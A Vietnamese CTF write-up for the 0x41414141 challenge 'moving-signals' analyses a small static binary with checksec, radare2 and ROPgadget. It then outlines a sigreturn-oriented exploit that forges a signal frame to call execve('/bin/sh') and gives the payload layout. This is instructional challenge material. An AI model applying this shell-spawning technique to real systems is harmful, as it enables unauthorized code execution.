
# Writeup 0x41414141
#   Author: Quasar
> # Challenge Name : moving-signals

## file challenge:  [moving-signals](https://github.com/19520611/Writeup/blob/main/0x41414141/src/moving-signals/moving-signals?raw=true)

Phân tích cơ bản:

file:
```
$ file moving-signals
moving-signals: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```
checksec:
```
$ checksec  moving-signals
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x40000)
    RWX:      Has RWX segments
```
r2:
```
$ r2 moving-signals
[0x00041000]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00041000]> afl
0x00041000    1 24           entry0
[0x00041000]> pdf entry0
            ;-- section..shellcode:
            ;-- segment.LOAD1:
            ;-- .shellcode:
            ;-- __start:
            ;-- _start:
            ;-- rip:
┌ 24: entry0 ();
│           0x00041000      48c7c7000000.  mov rdi, 0                  ; [01] -rwx section size 26 named .shellcode
│           0x00041007      4889e6         mov rsi, rsp
│           0x0004100a      4883ee08       sub rsi, 8
│           0x0004100e      48c7c2f40100.  mov rdx, 0x1f4              ; 500
│           0x00041015      0f05           syscall
└           0x00041017      c3             ret
[0x00041000]>
```
Qua công cụ r2 ta quan sát được luồng thực thi chính của chương trình. Quan sát các gadget.

Ropgadget:
```
 ROPgadget  --binary moving-signals
Gadgets information
============================================================
0x0000000000041013 : add byte ptr [rax], al ; syscall
0x000000000004100f : mov edx, 0x1f4 ; syscall
0x000000000004100e : mov rdx, 0x1f4 ; syscall
0x000000000004100d : or byte ptr [rax - 0x39], cl ; ret 0x1f4
0x000000000004100c : out dx, al ; or byte ptr [rax - 0x39], cl ; ret 0x1f4
0x0000000000041018 : pop rax ; ret
0x0000000000041017 : ret
0x0000000000041010 : ret 0x1f4
0x0000000000041015 : syscall

Unique gadgets found: 9
```
Vì có gadget ```pop rax ; ret``` nên ta có thể điều khiển được $rax. Mình sẽ sử dụng syscall rt_sigreturn ($rax = 0xf)
  
Ta sẽ đưa các fake frame vào stack và làm cho rt_sigreturn gọi syscall với các fake frame của ta. Fake frame:
- rax = 0x3b (sys_execve)
- rdi = 0x41250
- rip = 0x41015 (syscall)

Tìm địa chỉ của ```/bin/sh``` trong chương trình:
```
pwndbg> search /bin/sh
moving-signals  0x41250 0x68732f6e69622f /* '/bin/sh' */
pwndbg>
```
Đã có đầy đủ payload của chúng ta sẽ như sau: payload = b'A'*8 + pop_rax + 0xf +syscall + frame.

Get flag:

### ![screenshot](https://github.com/19520611/Writeup/blob/main/0x41414141/img/moving.PNG)








 

